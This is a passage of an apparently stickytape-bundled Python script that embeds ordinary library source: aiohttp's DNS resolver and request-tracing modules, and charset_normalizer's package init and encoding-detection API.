3:\r\n                    # IPv6 is not supported by Python build,\r\n                    # or IPv6 is not enabled in the host\r\n                    continue\r\n                if address[3]:  # type: ignore[misc]\r\n                    # This is essential for link-local IPv6 addresses.\r\n                    # LL IPv6 is a VERY rare case. Strictly speaking, we should use\r\n                    # getnameinfo() unconditionally, but performance makes sense.\r\n                    host, _port = socket.getnameinfo(\r\n                        address, socket.NI_NUMERICHOST | socket.NI_NUMERICSERV\r\n                    )\r\n                    port = int(_port)\r\n                else:\r\n                    host, port = address[:2]\r\n            else:  # IPv4\r\n                assert family == socket.AF_INET\r\n                host, port = address  # type: ignore[misc]\r\n            hosts.append(\r\n                {\r\n                    "hostname": hostname,\r\n                    "host": host,\r\n                    "port": port,\r\n                    "family": family,\r\n                    "proto": proto,\r\n                    "flags": socket.AI_NUMERICHOST | socket.AI_NUMERICSERV,\r\n                }\r\n            )\r\n\r\n        return hosts\r\n\r\n    async def close(self) -> None:\r\n        pass\r\n\r\n\r\nclass AsyncResolver(AbstractResolver):\r\n    """Use the `aiodns` package to make asynchronous DNS lookups"""\r\n\r\n    def __init__(\r\n        self,\r\n        loop: Optional[asyncio.AbstractEventLoop] = None,\r\n        *args: Any,\r\n        **kwargs: Any\r\n    ) -> None:\r\n        if aiodns is None:\r\n            raise RuntimeError("Resolver requires aiodns library")\r\n\r\n        self._loop = get_running_loop(loop)\r\n        self._resolver = aiodns.DNSResolver(*args, loop=loop, **kwargs)\r\n\r\n        if not hasattr(self._resolver, "gethostbyname"):\r\n            # aiodns 1.1 is not available, fallback to DNSResolver.query\r\n            self.resolve = self._resolve_with_query  # type: ignore\r\n\r\n    async def resolve(\r\n        self, host: str, port: int = 0, family: int = socket.AF_INET\r\n    ) -> List[Dict[str, Any]]:\r\n        try:\r\n            resp = await self._resolver.gethostbyname(host, family)\r\n        except aiodns.error.DNSError as exc:\r\n            msg = exc.args[1] if len(exc.args) >= 1 else "DNS lookup failed"\r\n            raise OSError(msg) from exc\r\n        hosts = []\r\n        for address in resp.addresses:\r\n            hosts.append(\r\n                {\r\n                    "hostname": host,\r\n                    "host": address,\r\n                    "port": port,\r\n                    "family": family,\r\n                    "proto": 0,\r\n                    "flags": socket.AI_NUMERICHOST | socket.AI_NUMERICSERV,\r\n                }\r\n            )\r\n\r\n        if not hosts:\r\n            raise OSError("DNS lookup failed")\r\n\r\n        return hosts\r\n\r\n    async def _resolve_with_query(\r\n        self, host: str, port: int = 0, family: int = socket.AF_INET\r\n    ) -> List[Dict[str, Any]]:\r\n        if family == socket.AF_INET6:\r\n            qtype = "AAAA"\r\n        else:\r\n            qtype = "A"\r\n\r\n        try:\r\n            resp = await self._resolver.query(host, qtype)\r\n        except aiodns.error.DNSError as exc:\r\n            msg = exc.args[1] if len(exc.args) >= 1 else "DNS lookup failed"\r\n            raise OSError(msg) from exc\r\n\r\n        hosts = []\r\n        for rr in resp:\r\n            hosts.append(\r\n                {\r\n                    "hostname": host,\r\n                    "host": rr.host,\r\n                    "port": port,\r\n                    "family": family,\r\n                    "proto": 0,\r\n                    "flags": socket.AI_NUMERICHOST,\r\n                }\r\n            )\r\n\r\n        if not hosts:\r\n            raise OSError("DNS lookup failed")\r\n\r\n        return hosts\r\n\r\n    async def close(self) -> None:\r\n        self._resolver.cancel()\r\n\r\n\r\n_DefaultType = Type[Union[AsyncResolver, ThreadedResolver]]\r\nDefaultResolver: _DefaultType = AsyncResolver if aiodns_default else ThreadedResolver\r\n')
    __stickytape_write_module('aiohttp/tracing.py', b'from types import SimpleNamespace\r\nfrom typing import TYPE_CHECKING, Awaitable, Optional, Type, TypeVar\r\n\r\nimport attr\r\nfrom aiosignal import Signal\r\nfrom multidict import CIMultiDict\r\nfrom yarl import URL\r\n\r\nfrom .client_reqrep import ClientResponse\r\n\r\nif TYPE_CHECKING:  # pragma: no cover\r\n    from .client import ClientSession\r\n    from .typedefs import Protocol\r\n\r\n    _ParamT_contra = TypeVar("_ParamT_contra", contravariant=True)\r\n\r\n    class _SignalCallback(Protocol[_ParamT_contra]):\r\n        def __call__(\r\n            self,\r\n            __client_session: ClientSession,\r\n            __trace_config_ctx: SimpleNamespace,\r\n            __params: _ParamT_contra,\r\n        ) -> Awaitable[None]:\r\n            ...\r\n\r\n\r\n__all__ = (\r\n    "TraceConfig",\r\n    "TraceRequestStartParams",\r\n    "TraceRequestEndParams",\r\n    "TraceRequestExceptionParams",\r\n    "TraceConnectionQueuedStartParams",\r\n    "TraceConnectionQueuedEndParams",\r\n    "TraceConnectionCreateStartParams",\r\n    "TraceConnectionCreateEndParams",\r\n    "TraceConnectionReuseconnParams",\r\n    "TraceDnsResolveHostStartParams",\r\n    "TraceDnsResolveHostEndParams",\r\n    "TraceDnsCacheHitParams",\r\n    "TraceDnsCacheMissParams",\r\n    "TraceRequestRedirectParams",\r\n    "TraceRequestChunkSentParams",\r\n    "TraceResponseChunkReceivedParams",\r\n    "TraceRequestHeadersSentParams",\r\n)\r\n\r\n\r\nclass TraceConfig:\r\n    """First-class used to trace requests launched via ClientSession objects."""\r\n\r\n    def __init__(\r\n        self, trace_config_ctx_factory: Type[SimpleNamespace] = SimpleNamespace\r\n    ) -> None:\r\n        self._on_request_start = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestStartParams]]\r\n        self._on_request_chunk_sent = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestChunkSentParams]]\r\n        self._on_response_chunk_received = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceResponseChunkReceivedParams]]\r\n        self._on_request_end = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestEndParams]]\r\n        self._on_request_exception = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestExceptionParams]]\r\n        self._on_request_redirect = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestRedirectParams]]\r\n        self._on_connection_queued_start = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceConnectionQueuedStartParams]]\r\n        self._on_connection_queued_end = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceConnectionQueuedEndParams]]\r\n        self._on_connection_create_start = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceConnectionCreateStartParams]]\r\n        self._on_connection_create_end = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceConnectionCreateEndParams]]\r\n        self._on_connection_reuseconn = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceConnectionReuseconnParams]]\r\n        self._on_dns_resolvehost_start = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceDnsResolveHostStartParams]]\r\n        self._on_dns_resolvehost_end = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceDnsResolveHostEndParams]]\r\n        self._on_dns_cache_hit = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceDnsCacheHitParams]]\r\n        self._on_dns_cache_miss = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceDnsCacheMissParams]]\r\n        self._on_request_headers_sent = Signal(\r\n            self\r\n        )  # type: Signal[_SignalCallback[TraceRequestHeadersSentParams]]\r\n\r\n        self._trace_config_ctx_factory = trace_config_ctx_factory\r\n\r\n    def trace_config_ctx(\r\n        self, trace_request_ctx: Optional[SimpleNamespace] = None\r\n    ) -> SimpleNamespace:\r\n        """Return a new trace_config_ctx instance"""\r\n        return self._trace_config_ctx_factory(trace_request_ctx=trace_request_ctx)\r\n\r\n    def freeze(self) -> None:\r\n        self._on_request_start.freeze()\r\n        self._on_request_chunk_sent.freeze()\r\n        self._on_response_chunk_received.freeze()\r\n        self._on_request_end.freeze()\r\n        self._on_request_exception.freeze()\r\n        self._on_request_redirect.freeze()\r\n        self._on_connection_queued_start.freeze()\r\n        self._on_connection_queued_end.freeze()\r\n        self._on_connection_create_start.freeze()\r\n        self._on_connection_create_end.freeze()\r\n        self._on_connection_reuseconn.freeze()\r\n        self._on_dns_resolvehost_start.freeze()\r\n        self._on_dns_resolvehost_end.freeze()\r\n        self._on_dns_cache_hit.freeze()\r\n        self._on_dns_cache_miss.freeze()\r\n        self._on_request_headers_sent.freeze()\r\n\r\n    @property\r\n    def on_request_start(self) -> "Signal[_SignalCallback[TraceRequestStartParams]]":\r\n        return self._on_request_start\r\n\r\n    @property\r\n    def on_request_chunk_sent(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceRequestChunkSentParams]]":\r\n        return self._on_request_chunk_sent\r\n\r\n    @property\r\n    def on_response_chunk_received(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceResponseChunkReceivedParams]]":\r\n        return self._on_response_chunk_received\r\n\r\n    @property\r\n    def on_request_end(self) -> "Signal[_SignalCallback[TraceRequestEndParams]]":\r\n        return self._on_request_end\r\n\r\n    @property\r\n    def on_request_exception(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceRequestExceptionParams]]":\r\n        return self._on_request_exception\r\n\r\n    @property\r\n    def on_request_redirect(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceRequestRedirectParams]]":\r\n        return self._on_request_redirect\r\n\r\n    @property\r\n    def on_connection_queued_start(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceConnectionQueuedStartParams]]":\r\n        return self._on_connection_queued_start\r\n\r\n    @property\r\n    def on_connection_queued_end(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceConnectionQueuedEndParams]]":\r\n        return self._on_connection_queued_end\r\n\r\n    @property\r\n    def on_connection_create_start(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceConnectionCreateStartParams]]":\r\n        return self._on_connection_create_start\r\n\r\n    @property\r\n    def on_connection_create_end(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceConnectionCreateEndParams]]":\r\n        return self._on_connection_create_end\r\n\r\n    @property\r\n    def on_connection_reuseconn(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceConnectionReuseconnParams]]":\r\n        return self._on_connection_reuseconn\r\n\r\n    @property\r\n    def on_dns_resolvehost_start(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceDnsResolveHostStartParams]]":\r\n        return self._on_dns_resolvehost_start\r\n\r\n    @property\r\n    def on_dns_resolvehost_end(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceDnsResolveHostEndParams]]":\r\n        return self._on_dns_resolvehost_end\r\n\r\n    @property\r\n    def on_dns_cache_hit(self) -> "Signal[_SignalCallback[TraceDnsCacheHitParams]]":\r\n        return self._on_dns_cache_hit\r\n\r\n    @property\r\n    def on_dns_cache_miss(self) -> "Signal[_SignalCallback[TraceDnsCacheMissParams]]":\r\n        return self._on_dns_cache_miss\r\n\r\n    @property\r\n    def on_request_headers_sent(\r\n        self,\r\n    ) -> "Signal[_SignalCallback[TraceRequestHeadersSentParams]]":\r\n        return self._on_request_headers_sent\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestStartParams:\r\n    """Parameters sent by the `on_request_start` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    headers: "CIMultiDict[str]"\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestChunkSentParams:\r\n    """Parameters sent by the `on_request_chunk_sent` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    chunk: bytes\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceResponseChunkReceivedParams:\r\n    """Parameters sent by the `on_response_chunk_received` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    chunk: bytes\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestEndParams:\r\n    """Parameters sent by the `on_request_end` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    headers: "CIMultiDict[str]"\r\n    response: ClientResponse\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestExceptionParams:\r\n    """Parameters sent by the `on_request_exception` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    headers: "CIMultiDict[str]"\r\n    exception: BaseException\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestRedirectParams:\r\n    """Parameters sent by the `on_request_redirect` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    headers: "CIMultiDict[str]"\r\n    response: ClientResponse\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceConnectionQueuedStartParams:\r\n    """Parameters sent by the `on_connection_queued_start` signal"""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceConnectionQueuedEndParams:\r\n    """Parameters sent by the `on_connection_queued_end` signal"""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceConnectionCreateStartParams:\r\n    """Parameters sent by the `on_connection_create_start` signal"""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceConnectionCreateEndParams:\r\n    """Parameters sent by the `on_connection_create_end` signal"""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceConnectionReuseconnParams:\r\n    """Parameters sent by the `on_connection_reuseconn` signal"""\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceDnsResolveHostStartParams:\r\n    """Parameters sent by the `on_dns_resolvehost_start` signal"""\r\n\r\n    host: str\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceDnsResolveHostEndParams:\r\n    """Parameters sent by the `on_dns_resolvehost_end` signal"""\r\n\r\n    host: str\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceDnsCacheHitParams:\r\n    """Parameters sent by the `on_dns_cache_hit` signal"""\r\n\r\n    host: str\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceDnsCacheMissParams:\r\n    """Parameters sent by the `on_dns_cache_miss` signal"""\r\n\r\n    host: str\r\n\r\n\r\n@attr.s(auto_attribs=True, frozen=True, slots=True)\r\nclass TraceRequestHeadersSentParams:\r\n    """Parameters sent by the `on_request_headers_sent` signal"""\r\n\r\n    method: str\r\n    url: URL\r\n    headers: "CIMultiDict[str]"\r\n\r\n\r\nclass Trace:\r\n    """Internal dependency holder class.\r\n\r\n    Used to keep together the main dependencies used\r\n    at the moment of send a signal.\r\n    """\r\n\r\n    def __init__(\r\n        self,\r\n        session: "ClientSession",\r\n        trace_config: TraceConfig,\r\n        trace_config_ctx: SimpleNamespace,\r\n    ) -> None:\r\n        self._trace_config = trace_config\r\n        self._trace_config_ctx = trace_config_ctx\r\n        self._session = session\r\n\r\n    async def send_request_start(\r\n        self, method: str, url: URL, headers: "CIMultiDict[str]"\r\n    ) -> None:\r\n        return await self._trace_config.on_request_start.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestStartParams(method, url, headers),\r\n        )\r\n\r\n    async def send_request_chunk_sent(\r\n        self, method: str, url: URL, chunk: bytes\r\n    ) -> None:\r\n        return await self._trace_config.on_request_chunk_sent.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestChunkSentParams(method, url, chunk),\r\n        )\r\n\r\n    async def send_response_chunk_received(\r\n        self, method: str, url: URL, chunk: bytes\r\n    ) -> None:\r\n        return await self._trace_config.on_response_chunk_received.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceResponseChunkReceivedParams(method, url, chunk),\r\n        )\r\n\r\n    async def send_request_end(\r\n        self,\r\n        method: str,\r\n        url: URL,\r\n        headers: "CIMultiDict[str]",\r\n        response: ClientResponse,\r\n    ) -> None:\r\n        return await self._trace_config.on_request_end.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestEndParams(method, url, headers, response),\r\n        )\r\n\r\n    async def send_request_exception(\r\n        self,\r\n        method: str,\r\n        url: URL,\r\n        headers: "CIMultiDict[str]",\r\n        exception: BaseException,\r\n    ) -> None:\r\n        return await self._trace_config.on_request_exception.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestExceptionParams(method, url, headers, exception),\r\n        )\r\n\r\n    async def send_request_redirect(\r\n        self,\r\n        method: str,\r\n        url: URL,\r\n        headers: "CIMultiDict[str]",\r\n        response: ClientResponse,\r\n    ) -> None:\r\n        return await self._trace_config._on_request_redirect.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestRedirectParams(method, url, headers, response),\r\n        )\r\n\r\n    async def send_connection_queued_start(self) -> None:\r\n        return await self._trace_config.on_connection_queued_start.send(\r\n            self._session, self._trace_config_ctx, TraceConnectionQueuedStartParams()\r\n        )\r\n\r\n    async def send_connection_queued_end(self) -> None:\r\n        return await self._trace_config.on_connection_queued_end.send(\r\n            self._session, self._trace_config_ctx, TraceConnectionQueuedEndParams()\r\n        )\r\n\r\n    async def send_connection_create_start(self) -> None:\r\n        return await self._trace_config.on_connection_create_start.send(\r\n            self._session, self._trace_config_ctx, TraceConnectionCreateStartParams()\r\n        )\r\n\r\n    async def send_connection_create_end(self) -> None:\r\n        return await self._trace_config.on_connection_create_end.send(\r\n            self._session, self._trace_config_ctx, TraceConnectionCreateEndParams()\r\n        )\r\n\r\n    async def send_connection_reuseconn(self) -> None:\r\n        return await self._trace_config.on_connection_reuseconn.send(\r\n            self._session, self._trace_config_ctx, TraceConnectionReuseconnParams()\r\n        )\r\n\r\n    async def send_dns_resolvehost_start(self, host: str) -> None:\r\n        return await self._trace_config.on_dns_resolvehost_start.send(\r\n            self._session, self._trace_config_ctx, TraceDnsResolveHostStartParams(host)\r\n        )\r\n\r\n    async def send_dns_resolvehost_end(self, host: str) -> None:\r\n        return await self._trace_config.on_dns_resolvehost_end.send(\r\n            self._session, self._trace_config_ctx, TraceDnsResolveHostEndParams(host)\r\n        )\r\n\r\n    async def send_dns_cache_hit(self, host: str) -> None:\r\n        return await self._trace_config.on_dns_cache_hit.send(\r\n            self._session, self._trace_config_ctx, TraceDnsCacheHitParams(host)\r\n        )\r\n\r\n    async def send_dns_cache_miss(self, host: str) -> None:\r\n        return await self._trace_config.on_dns_cache_miss.send(\r\n            self._session, self._trace_config_ctx, TraceDnsCacheMissParams(host)\r\n        )\r\n\r\n    async def send_request_headers(\r\n        self, method: str, url: URL, headers: "CIMultiDict[str]"\r\n    ) -> None:\r\n        return await self._trace_config._on_request_headers_sent.send(\r\n            self._session,\r\n            self._trace_config_ctx,\r\n            TraceRequestHeadersSentParams(method, url, headers),\r\n        )\r\n')
    __stickytape_write_module('charset_normalizer/__init__.py', b'# -*- coding: utf_8 -*-\n"""\nCharset-Normalizer\n~~~~~~~~~~~~~~\nThe Real First Universal Charset Detector.\nA library that helps you read text from an unknown charset encoding.\nMotivated by chardet, This package is trying to resolve the issue by taking a new approach.\nAll IANA character set names for which the Python core library provides codecs are supported.\n\nBasic usage:\n   >>> from charset_normalizer import from_bytes\n   >>> results = from_bytes(\'B\xd1\x81\xd0\xb5\xd0\xba\xd0\xb8 \xd1\x87\xd0\xbe\xd0\xb2\xd0\xb5\xd0\xba \xd0\xb8\xd0\xbc\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbe \xd0\xbd\xd0\xb0 \xd0\xbe\xd0\xb1\xd1\x80\xd0\xb0\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd0\xbd\xd0\xb8\xd0\xb5. O\xd0\xb1\xd1\x80\xd0\xb0\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd0\xbd\xd0\xb8\xd0\xb5\xd1\x82\xd0\xbe!\'.encode(\'utf_8\'))\n   >>> best_guess = results.best()\n   >>> str(best_guess)\n   \'B\xd1\x81\xd0\xb5\xd0\xba\xd0\xb8 \xd1\x87\xd0\xbe\xd0\xb2\xd0\xb5\xd0\xba \xd0\xb8\xd0\xbc\xd0\xb0 \xd0\xbf\xd1\x80\xd0\xb0\xd0\xb2\xd0\xbe \xd0\xbd\xd0\xb0 \xd0\xbe\xd0\xb1\xd1\x80\xd0\xb0\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd0\xbd\xd0\xb8\xd0\xb5. O\xd0\xb1\xd1\x80\xd0\xb0\xd0\xb7\xd0\xbe\xd0\xb2\xd0\xb0\xd0\xbd\xd0\xb8\xd0\xb5\xd1\x82\xd0\xbe!\'\n\nOthers methods and usages are available - see the full documentation\nat <https://github.com/Ousret/charset_normalizer>.\n:copyright: (c) 2021 by Ahmed TAHRI\n:license: MIT, see LICENSE for more details.\n"""\nimport logging\n\nfrom .api import from_bytes, from_fp, from_path, normalize\nfrom .legacy import (\n    CharsetDetector,\n    CharsetDoctor,\n    CharsetNormalizerMatch,\n    CharsetNormalizerMatches,\n    detect,\n)\nfrom .models import CharsetMatch, CharsetMatches\nfrom .utils import set_logging_handler\nfrom .version import VERSION, __version__\n\n__all__ = (\n    "from_fp",\n    "from_path",\n    "from_bytes",\n    "normalize",\n    "detect",\n    "CharsetMatch",\n    "CharsetMatches",\n    "CharsetNormalizerMatch",\n    "CharsetNormalizerMatches",\n    "CharsetDetector",\n    "CharsetDoctor",\n    "__version__",\n    "VERSION",\n    "set_logging_handler",\n)\n\n# Attach a NullHandler to the top level logger by default\n# https://docs.python.org/3.3/howto/logging.html#configuring-logging-for-a-library\n\nlogging.getLogger("charset_normalizer").addHandler(logging.NullHandler())\n')
    __stickytape_write_module('charset_normalizer/api.py', b'import logging\nfrom os.path import basename, splitext\nfrom typing import BinaryIO, List, Optional, Set\n\ntry:\n    from os import PathLike\nexcept ImportError:  # pragma: no cover\n    PathLike = str  # type: ignore\n\nfrom .cd import (\n    coherence_ratio,\n    encoding_languages,\n    mb_encoding_languages,\n    merge_coherence_ratios,\n)\nfrom .constant import IANA_SUPPORTED, TOO_BIG_SEQUENCE, TOO_SMALL_SEQUENCE, TRACE\nfrom .md import mess_ratio\nfrom .models import CharsetMatch, CharsetMatches\nfrom .utils import (\n    any_specified_encoding,\n    iana_name,\n    identify_sig_or_bom,\n    is_cp_similar,\n    is_multi_byte_encoding,\n    should_strip_sig_or_bom,\n)\n\n# Will most likely be controversial\n# logging.addLevelName(TRACE, "TRACE")\nlogger = logging.getLogger("charset_normalizer")\nexplain_handler = logging.StreamHandler()\nexplain_handler.setFormatter(\n    logging.Formatter("%(asctime)s | %(levelname)s | %(message)s")\n)\n\n\ndef from_bytes(\n    sequences: bytes,\n    steps: int = 5,\n    chunk_size: int = 512,\n    threshold: float = 0.2,\n    cp_isolation: List[str] = None,\n    cp_exclusion: List[str] = None,\n    preemptive_behaviour: bool = True,\n    explain: bool = False,\n) -> CharsetMatches:\n    """\n    Given a raw bytes sequence, return the best possibles charset usable to render str objects.\n    If there is no results, it is a strong indicator that the source is binary/not text.\n    By default, the process will extract 5 blocs of 512o each to assess the mess and coherence of a given sequence.\n    And will give up a particular code page after 20% of measured mess. Those criteria are customizable at will.\n\n    The preemptive behavior DOES NOT replace the traditional detection workflow, it prioritize a particular code page\n    but never take it for granted. Can improve the performance.\n\n    You may want to focus your attention to some code page or/and not others, use cp_isolation and cp_exclusion for that\n    purpose.\n\n    This function will strip the SIG in the payload/sequence every time except on UTF-16, UTF-32.\n    By default the library does not setup any handler other than the NullHandler, if you choose to set the \'explain\'\n    toggle to True it will alter the logger configuration to add a StreamHandler that is suitable for debugging.\n    Custom logging format and handler can be set manually.\n    """\n\n    if not isinstance(sequences, (bytearray, bytes)):\n        raise TypeError(\n            "Expected object of type bytes or bytearray, got: {0}".format(\n                type(sequences)\n            )\n        )\n\n    if explain:\n        previous_logger_level = logger.level  # type: int\n        logger.addHandler(explain_handler)\n        logger.setLevel(TRACE)\n\n    length = len(sequences)  # type: int\n\n    if length == 0:\n        logger.debug("Encoding detection on empty bytes, assuming utf_8 intention.")\n        if explain:\n            logger.removeHandler(explain_handler)\n            logger.setLevel(previous_logger_level or logging.WARNING)\n        return CharsetMatches([CharsetMatch(sequences, "utf_8", 0.0, False, [], "")])\n\n    if cp_isolation is not None:\n        logger.log(\n            TRACE,\n            "cp_isolation is set. use this flag for debugging purpose. "\n            "limited list of encoding allowed : %s.",\n            ", ".join(cp_isolation),\n        )\n        cp_isolation = [iana_name(cp, False) for cp in cp_isolation]\n    else:\n        cp_isolation = []\n\n    if cp_exclusion is not None:\n        logger.log(\n            TRACE,\n            "cp_exclusion is set. use this flag for debugging purpose. "\n            "limited list of encoding excluded : %s.",\n            ", ".join(cp_exclusion),\n        )\n        cp_exclusion = [iana_name(cp, False) for cp in cp_exclusion]\n    else:\n        cp_exclusion = []\n\n    if length <= (chunk_size * steps):\n        logger.log(\n            TRACE,\n            "override steps (%i) and chunk_size (%i) as content does not fit (%i byte(s) given) parameters.",\n            steps,\n            chunk_size,\n            length,\n        )\n        steps = 1\n        chunk_size = length\n\n    if steps > 1 and length / steps < chunk_size:\n        chunk_size = int(length / steps)\n\n    is_too_small_sequence = len(sequences) < TOO_SMALL_SEQUENCE  # type: bool\n    is_too_large_sequence = len(sequences) >= TOO_BIG_SEQUENCE  # type: bool\n\n    if is_too_small_sequence:\n        logger.log(\n            TRACE,\n            "Trying to detect encoding from a tiny portion of ({}) byte(s).".format(\n                length\n            ),\n        )\n    elif is_too_large_sequence:\n        logger.log(\n            TRACE,\n            "Using lazy str decoding because the payload is quite large, ({}) byte(s).".format(\n                length\n            ),\n        )\n\n    prioritized_encodings = []  # type: List[str]\n\n    specified_encoding = (\n        any_specified_encoding(sequences) if preemptive_behaviour else None\n    )  # type: Optional[str]\n\n    if specified_encoding is not None:\n        prioritized_encodings.append(specified_encoding)\n        logger.log(\n            TRACE,\n            "Detected declarative mark in sequence. Priority +1 given for %s.",\n            specified_encoding,\n        )\n\n    tested = set()  # type: Set[str]\n    tested_but_hard_failure = []  # type: List[str]\n    tested_but_soft_failure = []  # type: List[str]\n\n    fallback_ascii = None  # type: Optional[CharsetMatch]\n    fallback_u8 = None  # type: Optional[CharsetMatch]\n    fallback_specified = None  # type: Optional[CharsetMatch]\n\n    results = CharsetMatches()  # type: CharsetMatches\n\n    sig_encoding, sig_payload = identify_sig_or_bom(sequences)\n\n    if sig_encoding is not None:\n        prioritized_encodings.append(sig_encoding)\n        logger.log(\n            TRACE,\n            "Detected a SIG or BOM mark on first %i byte(s). Priority +1 given for %s.",\n            len(sig_payload),\n            sig_encoding,\n        )\n\n    prioritized_encodings.append("ascii")\n\n    if "utf_8" not in prioritized_encodings:\n        prioritized_encodings.append("utf_8")\n\n    for encoding_iana in prioritized_encodings + IANA_SUPPORTED:\n\n        if cp_isolation and encoding_iana not in cp_isolation:\n            continue\n\n        if cp_exclusion and encoding_iana in cp_exclusion:\n            continue\n\n        if encoding_iana in tested:\n            continue\n\n        tested.add(encoding_iana)\n\n        decoded_payload = None  # type: Optional[str]\n        bom_or_sig_available = sig_encoding == encoding_iana  # type: bool\n        strip_sig_or_bom = bom_or_sig_available and should_strip_sig_or_bom(\n            encoding_iana\n        )  # type: bool\n\n        if encoding_iana in {"utf_16", "utf_32"} and not bom_or_sig_available:\n            logger.log(\n                TRACE,\n                "Encoding %s wont be tested as-is because it require a BOM. Will try some sub-encoder LE/BE.",\n                encoding_iana,\n            )\n            continue\n\n        try:\n            is_multi_byte_decoder = is_multi_byte_encoding(encoding_iana)  # type: bool\n        except (ModuleNotFoundError, ImportError):\n            logger.log(\n                TRACE,\n                "Encoding %s does not provide an IncrementalDecoder",\n                encoding_iana,\n            )\n            continue\n\n        try:\n            if is_too_large_sequence and is_multi_byte_decoder is False:\n                str(\n                    sequences[: int(50e4)]\n                    if strip_sig_or_bom is False\n                    else sequences[len(sig_payload) : int(50e4)],\n                    encoding=encoding_iana,\n                )\n            else:\n                decoded_payload = str(\n                    sequences\n                    if strip_sig_or_bom is False\n                    else sequences[len(sig_payload) :],\n                    encoding=encoding_iana,\n                )\n        except (UnicodeDecodeError, LookupError) as e:\n            if not isinstance(e, LookupError):\n                logger.log(\n                    TRACE,\n                    "Code page %s does not fit given bytes sequence at ALL. %s",\n                    encoding_iana,\n                    str(e),\n                )\n            tested_but_hard_failure.append(encoding_iana)\n            continue\n\n        similar_soft_failure_test = False  # type: bool\n\n        for encoding_soft_failed in tested_but_soft_failure:\n            if is_cp_similar(encoding_iana, encoding_soft_failed):\n                similar_soft_failure_test = True\n                break\n\n        if similar_soft_failure_test:\n            logger.log(\n                TRACE,\n                "%s is deemed too similar to code page %s and was consider unsuited already. Continuing!",\n                encoding_iana,\n                encoding_soft_failed,\n            )\n            continue\n\n        r_ = range(\n            0 if not bom_or_sig_available else len(sig_payload),\n            length,\n            int(length / steps),\n        )\n\n        multi_byte_bonus = (\n            is_multi_byte_decoder\n            and decoded_payload is not None\n            and len(decoded_payload) < length\n        )  # type: bool\n\n        if multi_byte_bonus:\n            logger.log(\n                TRACE,\n                "Code page %s is a multi byte encoding table and it appear that at least one character "\n                "was encoded using n-bytes.",\n                encoding_iana,\n            )\n\n        max_chunk_gave_up = int(len(r_) / 4)  # type: int\n\n        max_chunk_gave_up = max(max_chunk_gave_up, 2)\n        early_stop_count = 0  # type: int\n        lazy_str_hard_failure = False\n\n        md_chunks = []  # type: List[str]\n        md_ratios = []\n\n        for i in r_:\n            if i + chunk_size > length + 8:\n                continue\n\n            cut_sequence = sequences[i : i + chunk_size]\n\n            if bom_or_sig_available and strip_sig_or_bom is False:\n                cut_sequence = sig_payload + cut_sequence\n\n            try:\n                chunk = cut_sequence.decode(\n                    encoding_iana,\n                    errors="ignore" if 